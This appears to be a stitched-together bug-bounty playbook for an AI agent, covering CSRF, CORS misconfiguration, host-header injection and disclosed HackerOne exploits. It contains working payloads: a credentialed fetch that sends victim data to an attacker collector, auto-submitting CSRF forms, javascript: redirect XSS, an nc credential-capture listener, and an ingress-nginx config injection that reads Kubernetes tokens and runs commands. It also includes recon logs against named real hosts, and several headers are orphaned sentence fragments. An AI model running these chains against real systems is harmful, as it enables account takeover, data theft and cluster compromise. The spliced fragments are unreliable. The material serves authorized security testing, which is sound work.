# csrf-hostheader — part 1/1 (23 segment(s))
# content-aware dedupe applied; every unique entry preserved.

## [Bugbountyskills.md] >> csrf-testing — SKILL.md

*Source: `/root/Myskill/csrf-testing/SKILL.md`*

## [Bugbountyskills.md] CSRF Testing

Deep playbook for cross-site request forgery in authorized bug bounty and assessment
work. The classic taxonomy is folded together with the v2.1 deep-mutation set into 18
variants; each variant is a specific, testable failure mode of a anti-CSRF control, not
a generic "no token found" note.

## [Bugbountyskills.md] >> csrf-testing — payloads.md (request templates, tool commands, evasion)

*Source: `/root/Myskill/csrf-testing/references/payloads.md`*

## [Bugbountyskills.md] CSRF payloads, request templates and evasion notes

All templates use `<PLACEHOLDER>` slots — substitute target values from your own
recon, never a live target you are not authorized to test. Cross-reference variants
V-01..V-18 in `variants-1.md` / `variants-2.md` for which template applies when.

## [Bugbountyskills.md] fetch / XHR PoC (no-cors + credentials)

**Write CSRF, fire-and-forget:** `mode:'no-cors'` means the response is opaque (you
cannot read it), but the request executes with cookies when the content type is
simple. `credentials:'include'` is what actually attaches cross-origin cookies —
without it modern fetch defaults to `same-origin` and your test silently proves
nothing (the #1 self-inflicted false negative).

```js
// V-01/V-12/V-13: simple request, cookies included, no preflight expected
fetch('https://<TARGET_HOST>/<STATE_CHANGING_PATH>', {
  method: 'POST',
  mode: 'no-cors',            // opaque response; side effect still lands
  credentials: 'include',     // attach victim cookies cross-origin
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: '<BUSINESS_PARAM>=<ATTACKER_VALUE>'
});

// V-14: readable response (requires permissive CORS with credentials)
fetch('https://<TARGET_HOST>/<SENSITIVE_GET_PATH>', { credentials: 'include' })
  .then(r => r.json())
  .then(d => fetch('https://<ATTACKER_COLLECTOR>', {
    method: 'POST', mode: 'no-cors', body: JSON.stringify(d)
  }));
```

XHR equivalent (legacy stacks / V-12 probes):

```js
var x = new XMLHttpRequest();
x.open('POST', 'https://<TARGET_HOST>/<STATE_CHANGING_PATH>', true);
x.withCredentials = true;                      // same as credentials:'include'
x.setRequestHeader('Content-Type', 'text/plain'); // simple CT → no preflight (V-12)
x.send('<BUSINESS_PARAM>=<ATTACKER_VALUE>');
```

Gotchas that kill these PoCs in practice: omitting `credentials:'include'`;
`Content-Type: application/json` (not simple → preflight OPTIONS → read the actual
outcome in DevTools before claiming either success or block); SameSite=Lax cookie
refusing to ride a cross-site non-navigation request (retarget via the V-03
navigation form instead); expecting to *read* a no-cors response (impossible —
confirm impact server-side, not from JS).

## [Bugbountyskills.md] 3) raw response headers (Set-Cookie, CORS, CRLF splitting — V-10/V-14)

curl -sS -i -X OPTIONS 'https://<TARGET_HOST>/<API_PATH>' \
  -H 'Origin: https://<ATTACKER_ORIGIN>' \
  -H 'Access-Control-Request-Method: POST' \
  -H 'Access-Control-Request-Headers: content-type'

## [Bugbountyskills.md] >> csrf-testing — variants-1.md (variant playbook)

*Source: `/root/Myskill/csrf-testing/references/variants-1.md`*

## [Bugbountyskills.md] V-01: POST-based CSRF with hidden form parameter tampering

**Also known as:** classic "POST-based CSRF" / v2.1 "Hidden form parameter tampering via POST-based CSRF engine".
**Mechanism:** the browser treats the session cookie as the intent signal for a POST while every hidden input is attacker-chosen — the server honors business fields (user id, email, amount, role) the UI never lets the user edit. Violated assumption: "a well-formed POST from a logged-in browser was intended by that user."

**Preconditions:**
- Session carried in cookies, not an `Authorization` bearer header (bearer APIs are outside CSRF scope).
- Endpoint parses urlencoded/multipart with no effective token, Origin, or custom-header requirement (if one exists, run V-05..V-14 first).
- Victim authenticated; the action is not gated by step-up/password re-entry.

**Detect:**
1. From proxy history, list POSTs whose bodies carry hidden business fields (`user_id`, `email`, `role`, `amount`) the UI never exposes as editable.
2. Replay from your own session with the Cookie header removed — expect 401/403, proving auth is cookie-based.
3. Replay with cookie present but token / Origin / custom header stripped one variable at a time; record status **and** response body **and** side effect — all three, because each control fails differently.
4. Probe which headers are mandatory: drop `X-CSRF-Token`, then `X-Requested-With`; a protected request should die. If nothing changes, note whether protection is absent or header-only.

**Proof of concept:**
```html
<form id="f" method="POST" action="https://<TARGET_HOST>/<STATE_CHANGING_PATH>">
  <input type="hidden" name="<BUSINESS_PARAM>" value="<ATTACKER_VALUE>">
</form>
<script>document.getElementById('f').submit();</script>
```
Full auto-submit page and curl matrix: `references/payloads.md`.

**Confirm:** two signals — the PoC fired from a real browser on an attacker origin with the victim cookie visibly attached (DevTools network), and the persisted state change re-fetched **as the victim**. A curl-only success is a lead, never a confirmation.

**False positives:** curl succeeds but the cookie is `SameSite=Lax` and a genuine cross-site POST would never carry it (hand-assembled cookies prove nothing — that is V-03 territory); a 200 whose JSON body says "invalid token" — status lies, always read the body; POST returns 200 but the flow then demands re-authentication (read follow-up requests); CDN-cached 200s (check `Age`/`X-Cache`, add a cache-buster); token still riding in a header, query param, or double-submit cookie you forgot to strip.

**Impact:** attacker forces any state change the victim can perform (email change, API key creation, orders, invites, follows) — phrase as forced account-state change on this endpoint class, escalating severity where a sensitive endpoint shares the same pattern.

**Remediation:** validate a per-session, per-request token (or exact-origin check) in global middleware before business fields are parsed, so hidden input values are never the sole intent signal.

**CWE / OWASP:** CWE-352; OWASP Top 10 2021 A01 Broken Access Control (legacy A8:2017 CSRF).

---

## [Bugbountyskills.md] V-02: GET-based CSRF via cross-origin embedded resource traversal

**Also known as:** classic "GET-based CSRF" / v2.1 "Cross-origin embedded resource traversal via GET-based CSRF".
**Mechanism:** the endpoint mutates state on a method browsers treat as safe, so no token is checked and the request fires from merely embedding a URL (`<img>`, `<script>`, `<link>`, prefetch, top-level navigation). Violated assumption: GET only reads.

**Preconditions:**
- A GET/HEAD/DELETE (or a GET route like `/delete?id=`) changes state; token/Origin checks are absent on the safe method (common: middleware mounted on POST only).
- For **subresource** vectors the cookie must be `SameSite=None` — Lax cookies are NOT sent on cross-site subresource loads, only on top-level safe navigation (that split is V-03).

**Detect:**
1. Hunt mutations in GET history: `?action=`, `?delete=`, `?approve=`, token-less `logout`, `?unsubscribe=`; confirm with and without cookie — the state delta proves cookie auth + mutation.
2. Try the same path as HEAD and DELETE; one handler behind several methods feeds V-05.
3. Read the cookie's `SameSite` before choosing the vector: `None` → subresource embed works; `Lax` → only top-level navigation (`location.href`, meta refresh, `<form method="GET">` submit).
4. Check for a nonce/token in the query string your replay dropped — a 403 there means the GET itself is protected.

**Proof of concept:**
```html
<img src="https://<TARGET_HOST>/<STATE_CHANGING_GET_PATH>?<PARAM>=<VALUE>">
<script src="https://<TARGET_HOST>/<STATE_CHANGING_GET_PATH>?<PARAM>=<VALUE>"></script>
<script>location.href="https://<HOST>/<GET_PATH>?<PARAM>=<VALUE>";</script><!-- Lax-compatible -->
```
Templates: `references/payloads.md`.

**Confirm:** browser from an attacker origin — network panel shows the cookie actually attached to the embedded request or navigation (cookie attachment first, it rules out the SameSite trap), then the server-side state change on re-fetch.

**False positives:** "GET returns 200" when the action was already applied (idempotent repeat) or the response came from cache — vary a param, read the body, check `Age`; a URL that only *renders* a confirmation page while the real mutation is the follow-up POST (lead, not finding); dropping a nonce param made your replay fail and misled you into thinking the GET alone was the gate.

**Impact:** page view alone triggers the action (delete, approve, unfollow) — weaponizable via a single click in chat or email, which is why report impact should mention "no interaction beyond visiting a URL".

**Remediation:** restrict mutations to POST+ with token/Origin validation (HTTP safe methods), and mount those checks method-agnostically so GET handlers can never be a bypass.

**CWE / OWASP:** CWE-352, CWE-749 (Exposed Dangerous Method); OWASP A01 (legacy A8:2017).

---

## [Bugbountyskills.md] >> csrf-testing — variants-2.md (variant playbook)

*Source: `/root/Myskill/csrf-testing/references/variants-2.md`*

## [Bugbountyskills.md] CSRF Variants 9-18 — transport, header, parser and chain failures

Merged set continued: classic taxonomy folded with the v2.1 deep-mutation set; each
entry notes the alternate name it was folded from. Route from the selection table in
`SKILL.md`.

## [Bugbountyskills.md] V-14: SOP and CORS misconfiguration bypass with preflight mismatch

**Also known as:** classic "SOP & CORS misconfiguration bypass" / v2.1 "CORS preflight (OPTIONS) bypassing via client-side server response code mismatch".
**Mechanism:** CORS waives the SOP's read block; misconfiguring the waiver (reflected Origin + `Access-Control-Allow-Credentials: true`, `null` reflection, wildcard+credentials, subdomain over-trust, missing `Vary: Origin` letting a permissive `ACAO` be cached cross-user) upgrades CSRF into CSRF-plus-data-theft. The mismatch leg: `OPTIONS` answers 200+permissive while the actual response differs (or vice versa) — a permissive preflight with an `ACAO`-less actual response still lets the side-effecting request *execute* (write CSRF) even though the read is blocked. Violated assumption: "preflight verdict == actual verdict."

**Preconditions:**
- No token on the route (or you are exploiting the read leg on a GET API); CORS reflects/permits attacker origin with credentials, `null`, or broad wildcards — or OPTIONS/actual diverge (LB/CDN/middleware seams are where that is born).
- Credentialed reads need cookie `SameSite=None; Secure` — Lax kills the read leg (check V-03 first).

**Detect:**
1. Matrix × {origin: own, `https://<TARGET>.evil.tld`, `https://evil.tld`, `null`, `http://<TARGET>`, `https://<TARGET>:8443`} × {OPTIONS, actual GET/POST, with/without credentials} — record `ACAO`, `ACAC`, `ACAH`, `ACMA`, `Vary`, status.
2. `ACAO: *` + `ACAC: true`: browsers refuse it while curl happily prints it — note as misconfig, never claim a read.
3. `null` reflection is real only when proven from a sandboxed-iframe/`data:` document in a browser.
4. Mismatch: compare OPTIONS verdict vs actual verdict for the same origin; missing `Vary: Origin` + permissive cached `ACAO` → replay from a second client to test cross-user cache leakage.

**Proof of concept:**
```bash
curl -sS -i -X OPTIONS 'https://<TARGET_HOST>/<API_PATH>' -H 'Origin: https://<ATTACKER_ORIGIN>' \
  -H 'Access-Control-Request-Method: POST' -H 'Access-Control-Request-Headers: content-type'
```
```js
fetch('https://<TARGET_HOST>/<SENSITIVE_GET>', {credentials:'include'}).then(r=>r.json())
  .then(d=>fetch('https://<ATTACKER_COLLECTOR>',{method:'POST',mode:'no-cors',body:JSON.stringify(d)}));
```

**Confirm:** pick evidence by claim — read claim: victim-specific data (values that differ per session) actually received by the attacker page in a real browser; write claim: preflight observed passing or absent as a simple request **and** persisted state change; mismatch claim: both divergent verdicts captured for the same origin.

**False positives:** `ACAO` reflection *without* `ACAC` (no read possible — write-CSRF note only, not data theft); `ACAC` seen only in curl with wildcard (browser refuses wildcard+creds); "preflight bypassed" while the browser still refused the actual response (the console verdict is the only verdict); non-credentialed CORS on a public-data GET (no victim binding → no finding); cache claim without showing two different users' responses actually cross-contaminating (retest from a clean cache/second IP); **reflected Origin + `ACAC: true` whose response body is cookie-independent** — analytics collectors, tracking pixels and beacons routinely ship exactly this (Snowplow/Segment-style public collectors reflect any origin with credentials *by design*), and their bodies are a static 1×1 GIF or `{}`. Before filing, fetch the same URL twice with `-H 'Origin: https://evil.example'`, once bare and once with a stuffed `Cookie:`, and compare `sha256sum` of the bodies plus the `access-control-*` headers: identical bytes ⇒ nothing session-derived to steal ⇒ not a finding, log it as by-design and move on (2026-10-21, quizlet.com `jg7y` collector: reflected origin + ACAC, body SHA identical with/without cookies).

**Impact:** the severity escalator of this skill — the CORS waiver converts "forced action" into "attacker reads the response" (session-adjacent API data, PII, token endpoints); report read and write legs separately with distinct evidence.

**Remediation:** exact-origin allow-list (never blind reflection, never `null`, never wildcard+credentials), `Vary: Origin` on every dynamically CORS-answered response, and token checks on writes so CORS mistakes stay read-only.

**CWE / OWASP:** CWE-346 (Origin Validation Error), CWE-942 (Overly Permissive Cross-domain Whitelist), CWE-352; OWASP A01 (legacy A8:2017).

---

## [Bugbountyskills.md] (identitytoolkit.googleapis.com) adds them to the CORS preflight, the third

## [Bugbountyskills.md] before trusting sweep results — every protected SPA route silently redirects to

## [Bugbountyskills.md] User enum: author-redirect loop (301 to slug), oembed leak, REST users

for i in $(seq 1 50); do curl -s -o /dev/null -w "%{redirect_url}\n" "https://T/?author=$i"; done
curl -s "https://T/wp-json/wp/v2/users"

## [Bugbountyskills.md] CSRF (`csrf-testing`)

| Endpoint | Signal | Status |
|---|---|---|
| `PATCH /api/proxy/auth/me`, `PATCH /auth/changePassword` | state change, needs Origin/Referer check | Untested |
| `POST /api/proxy/business/desassociateTicket` | state change via POST + custom `token` header | Untested |
| `GET /auth/callback` | `state` validation on Okta/next-auth | Untested |
| All `/admin/*?token=` | token in query → also a **Referer-leak** vector | Untested |

Custom `Content-Type: application/json` + `token` header on the business routes means classic
cross-site form CSRF is likely inert — but **`GET`-side state changes and the OAuth `state` are
the real CSRF surface here.**

## [Bugbountyskills.md] 5. CSRF / Origin matrix (POST /users/sign_in, captcha-free flow)

```
A no token, no Origin                    -> 422 (redirected back to sign_in)
B valid token, Origin: https://evil.example -> 422
C valid token, no Origin (own session)   -> 200 (wrong-password re-render)
GET /users/sign_out                      -> 404  (no GET state change)
GET /users/sign_out.json                 -> 404
```
422 body carries no explanatory text ⇒ evidence is the B-vs-C status differential.
Session cookie: fresh value issued when none sent; no rotation on subsequent requests
(0 x `set-cookie` on 2nd request with jar).

## [Bugbountyskills.md] 6. CORS / method discovery (nonexistent UUID = zero collateral)

```
GET/PUT/PATCH/HEAD /api/v1/device_transfers/00000000-0000-0000-0000-000000000000 -> 401 (41 B)
POST, DELETE (same)            -> 404 (7790 B)   OPTIONS -> 404   TRACE -> 405 (150 B)
unauth API: HTTP/2 401, www-authenticate: Token realm="Application",
  body {"errors":["HTTP Token: Access denied."]}
bad token  -> 401 (same body)
malformed JSON body -> 422 {"errors":["Sorry, we weren't able to parse your request…"]}
CORS: Origin evil.example and Origin sandbox.reready.co on /, /users/sign_in,
  /api/v1/device_transfers -> NO Access-Control-Allow-Origin, no ACAC (anywhere)
```

## [Bugbountyskills.md] 7. Host header / redirects

```
GET http://165.227.99.141/  Host: evil.example                  -> 301 https://sandbox.reready.co/
GET http://165.227.99.141/  Host: sandbox.reready.co.evil.example -> 301 https://sandbox.reready.co/
GET http://165.227.99.141/  X-Forwarded-Host: evil.example      -> 301 https://sandbox.reready.co/
GET /users/sign_in?origin=|return_to=|redirect_to=https://evil.example -> 200 (renders form, no redirect)
```

### [Bugbountyskills.md] 17.83 `javascript:` URI accepted by a POST-LOGIN redirect parameter (`dest=`/`next=`/`return_to=`/`redirect_uri=`) — validation covers the host but not the scheme, and the sink is the CLIENT-SIDE post-auth navigation, not a server 302 (Reddit accounts.reddit.com #1962645)

SOURCE: https://hackerone.com/reports/1962645 — Reddit, "[accounts.reddit.com] Redirect parameter allows for XSS" (Cross-site Scripting - Generic; reporter dvorakxl; disclosed 2023-05-18)  read 2026-11-07 (full body 646 B from the local disclosed-reports dataset; `r.jina.ai` gave only the SPA shell)
CLASS: reflected XSS at the authentication boundary (scheme not validated in a redirect target) · CWE-79
CORE METHOD:
  1. Entry point: `https://accounts.reddit.com/?dest=<value>` (the post-login redirect target).
  2. Payload: `?dest=javascript:alert(document.domain)`.
  3. Not signed in -> the app prompts for login, then navigates to the unvalidated `dest` on success, so the `javascript:` URI executes in the accounts origin ("after doing so XSS will execute").
  4. Already signed in -> the same link executes immediately.
DETECTION SIGNAL: any `dest`/`next`/`continue`/`return_to`/`redirect_uri` parameter on a login/SSO/account origin; test the SCHEME, not just the host: `javascript:alert(document.domain)`, `data:text/html,<script>…`, `vbscript:…`, `//evil`, `/\evil`, `https:evil.com`; locate the SINK — a server `Location: javascript:` is inert, so the bug is where the value feeds `location.href=`/`location.assign`/`window.location=`/an SPA router push AFTER authentication.
CHAIN: crafted `accounts.<target>/?dest=javascript:<js>` -> victim authenticates (or is already authenticated) -> post-auth client-side navigation executes JS in the authenticated accounts origin -> cookie/CSRF-equivalent account actions -> ATO; the same shape inside an OAuth/OIDC `redirect_uri` yields code/token theft instead.
TRANSFERABLE TEST: send `?<redirect-param>=javascript:alert(document.domain)` on every login/account/SSO origin; if the alert fires after a successful login (or immediately when authenticated), the client-side post-auth navigation is the sink — then swap the alert for a privileged read or a state-changing POST from the accounts origin.

### [Bugbountyskills.md] 17.179 A config-injection fix lands per-ANNOTATION per-CVE — every OTHER annotation whose value renders into the same config file still reaches code execution, and disabling the patched feature does not close the class (ingress-nginx `nginx.ingress.kubernetes.io/permanent-redirect`, CVE-2023-5044 / HackerOne #2039464)

SOURCE: https://hackerone.com/reports/2039464 — Kubernetes, "Code inject via nginx.ingress.kubernetes.io/permanent-redirect annotation" (Code Injection; High 7.6, `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L`; $2,500; reporter jkroepke; created 2023-06-26, disclosed 2023-10-25; Kubernetes v1.26.3 minikube / ingress-nginx v1.8.0, nginx/1.21.6; CVE-2023-5044)  read 2026-11-07 via the full `.json` body (12,031 B) PLUS the report's own S3 attachments fetched the same pass — `ingress.yaml` (1,587 B, the payload) and `values.yaml` (59 B, `allow-snippet-annotations=false`); corroborated by `/tmp/h1_train.parquet` row 1475 and the Hugging Face `Hacker0x01/hackerone_disclosed_reports` train split.
CLASS: code injection → RCE in a templated reverse-proxy controller (CWE-94); a THIRD injection point beside §17.172 (`configuration-snippet` → Lua) and §17.178 (`spec.rules.http.paths.path` → log_format + `include`) — this one is an ANNOTATION whose value is a redirect string, and it works with snippet annotations DISABLED.
CORE METHOD (reporter's steps, verbatim structure):
  1. Precondition: "any user that is allowed to create ingress objects" (namespaced Ingress create/update); controller installed with `allow-snippet-annotations=false` (`helm upgrade -i ingress-nginx ingress-nginx/ingress-nginx -f values.yaml`) — the snippet vector is closed and the bug still fires through `permanent-redirect`.
  2. The annotation is a YAML block scalar so the value keeps NEWLINES: `nginx.ingress.kubernetes.io/permanent-redirect: |` → `https://exmaple.com;` then `}` (closes the generated `location`) `}` (closes the generated `server`) then a whole new `server { server_name kubernetes.api; listen 80; listen [::]:80; listen 443 ssl http2; listen [::]:443 ssl http2; location /api/ { content_by_lua_block { … } } }`.
  3. The value is written VERBATIM into `nginx.conf`; the annotation's intended 301 semantics are irrelevant. The Ingress rule's own `host: invalid.domain` / backend `default:8080` are decoys — the injected vhost answers on `server_name kubernetes.api`.
  4. The injected Lua is the escalation: `io.open("/var/run/secrets/kubernetes.io/serviceaccount/token","rb")` → `token:read("*a")` → `httpc:request_uri("https://kubernetes.default.svc.cluster.local" .. ngx.var.uri, { ssl_verify=false, headers = { Authorization = "Bearer " .. token } })` → `ngx.say(res.body)`.
  5. Verify: `curl -v --resolve "kubernetes.api:8080:127.0.0.1" http://kubernetes.api:8080/api/v1/namespaces/kube-system/secrets/` (port-forward the controller if unexposed) — the response is the API server answering the CONTROLLER'S OWN TOKEN: cluster secrets/configmaps readable, plus file read/write inside the pod.
DETECTION SIGNAL: a controller whose config is templated from user-settable annotations — the tell is the SURFACE: enumerate every annotation whose value is a free string reaching the rendered config (`permanent-redirect`, `permanent-redirect-code`, `rewrite-target`, `auth-url`, `auth-signin`, `custom-http-errors`, `server-snippet`/`configuration-snippet` where enabled, `proxy-set-header`, `mirror-target`). Probe: submit a multi-line value closing the current block and defining `server { server_name probe.<yours>; location / { return 200 "MARKER"; } }`, reload, request `Host: probe.<yours>`; MARKER = unfiltered surface. Secondary tells: the vendor's fix history validates ONE annotation per CVE (CVE-2023-5044 → `permanent-redirect`), `allow-snippet-annotations=false` set (operator believes snippets were the only injection point), OpenResty present with the SA token mounted at the always-present path `/var/run/secrets/kubernetes.io/serviceaccount/token`.
CHAIN: namespaced Ingress write (primitive) → `permanent-redirect` value spliced into `nginx.conf`, `}` + newline breaks out and declares a hidden vhost (primitive: config injection) → `content_by_lua_block` runs Lua in the controller pod (High 7.6) → the Lua reads the mounted token and calls `https://kubernetes.default.svc.cluster.local` (primitive: cluster API access as the controller's SA) → cluster-wide Secrets/ConfigMaps + pod filesystem write. The bridge from RCE to cluster compromise is the MOUNTED TOKEN.
TRANSFERABLE TEST: on any ingress-nginx/Traefik/HAProxy/Envoy/Istio you can create objects on, walk the ANNOTATION SURFACE instead of one sink: for each annotation whose value becomes a config string, submit the block-breakout probe and request the probe Host; where snippets are disabled, move to redirect/rewrite/auth annotations. On marker hit, replace `return 200` with `content_by_lua_block { ngx.say(io.popen(ngx.req.get_headers()['cmd'],'r'):read('*a')) }` for command execution, then the token-read + `kubernetes.default.svc` block for cluster access. Rule: **config-injection fixes land per-annotation per-CVE — keep the annotation list and re-test the whole list, especially where snippets are "already fixed".**
WHY IT IS A NEW GENERAL METHOD: §17.172 records a DIRECTIVE-DENYLIST bypass through an embedded scripting block and §17.178 records a config sanitizer defeated through the LOGGING directives + `include`; both stay inside the FIRST annotation the vendor hardened. Nothing records the class-level failure — that the fix is scoped to ONE annotation, so an unrelated annotation carrying a redirection/rewrite string renders into the same file and gives the same RCE, and that turning OFF the patched feature (`allow-snippet-annotations=false`) does not close it. Reusable rule: **for a templated-config surface, the unit of test is the FIELD LIST, not the CVE — every user-settable string that reaches the config file is its own injection point.** Slot 17.179.

### [Bugbountyskills.md] 17.188 A redirect-following client forwards its credentials across HOST and SCHEME — a 301 from an attacker-fetched URL to `ftp://attacker` leaks `USER`/`PASS` (curl CVE-2022-27774, HackerOne #1551586)

SOURCE: https://hackerone.com/reports/1551586 — Internet Bug Bounty, "CVE-2022-27774: Credential leak on redirect", Medium  read 2026-11-08 (`visibility: full`, `curl .../1551586.json`).
CLASS: credential/info disclosure via a redirect-following HTTP client (credential theft / auth primitive).
CORE METHOD: (1) the attacker's URL (or an attacker page) is fetched by the victim client; the server answers `RewriteRule ^/redirectpoc ftp://secondsite.tld:9999 [R=301,L]` (a different host AND a different scheme); (2) the attacker listens with a fake FTP banner (`echo -e "220 pocftp\n331 plz\n530 bye" | nc -v -l -p 9999`); (3) the victim runs `curl -L --user foo https://firstsite.tld/redirectpoc`; (4) the fake server receives `USER foo` / `PASS secretpassword` — credentials sent to a different host, over an insecure channel although the URL was HTTPS; TLS-SRP creds (`CURLOPT_TLSAUTH_USERNAME`/`_PASSWORD`) leak the same way.
DETECTION SIGNAL: a client that follows redirects (`-L`/`--location`, `--location-trusted`, default-on libs) and carries credentials or an `Authorization` header to the target; a redirect that changes host and/or scheme; server-side fetchers (webhook URL, import-by-URL, preview, image proxy, crawler) that authenticate to their first hop.
CHAIN: attacker-controlled URL fetched by a redirect-follower -> 30x to `ftp://attacker` -> the client re-sends `USER`/`PASS` or `Authorization` to the attacker -> the leaked credentials belong to the FIRST site = ATO. On a server-side fetcher it is the service's own stored credentials that leak.
TRANSFERABLE TEST: point a redirect-follower at your host and 301 it to a DIFFERENT host on a DIFFERENT scheme; watch for `Authorization`/`USER`/`PASS`/cookies; repeat on server-side fetchers. Rule: **following a redirect must drop credentials on a new host AND a new scheme — test every redirect-follower with a cross-host, cross-scheme hop.**
WHY IT IS A NEW GENERAL METHOD: this file's redirect material is OAuth `redirect_uri`, open-redirect -> token theft, and scheme-handler abuse; nothing records the CLIENT-LIBRARY case where an ordinary `curl -L` credential is silently re-sent to a new host and downgraded from HTTPS to FTP. Reusable rule: **credentials are scoped to the ORIGIN, and origin = host + port + scheme — any redirect-follower that does not enforce all three leaks them.** Slot 17.188.

### [bugbountyhuntingskills.md] 11.4 Host header injection → reset-link poisoning

**Source:** Bugcrowd disclosure (NASA VDP, 2024-11), *"1-Click account takeover via host header
injection"*; Intigriti auth guide.

**Core method**
- Trigger a password reset for the victim while rewriting the host the app uses to build the link:
  ```http
  POST /api/auth/forgot-password HTTP/1.1
  Host: attacker.com
  X-Forwarded-Host: attacker.com
  ```
  Variants: `Host: target.com@attacker.com`, `Host: attacker.com:443`, duplicate `Host` headers,
  `X-Forwarded-Server`, `X-Original-URL`, absolute-form request line
  (`POST https://attacker.com/... HTTP/1.1`).
- If the reset email embeds the poisoned host, the victim clicks a valid token on the attacker's
  domain → token captured → ATO.
- Confirm without a victim by using your own account: request a reset, inspect the link host.

**Lesson.** Any feature that emails a link is a host-header sink. Check password reset, email
verification, invite, invoice, and webhook-test emails. The `Host` header is also worth testing
against cache poisoning (see 12.4).

---

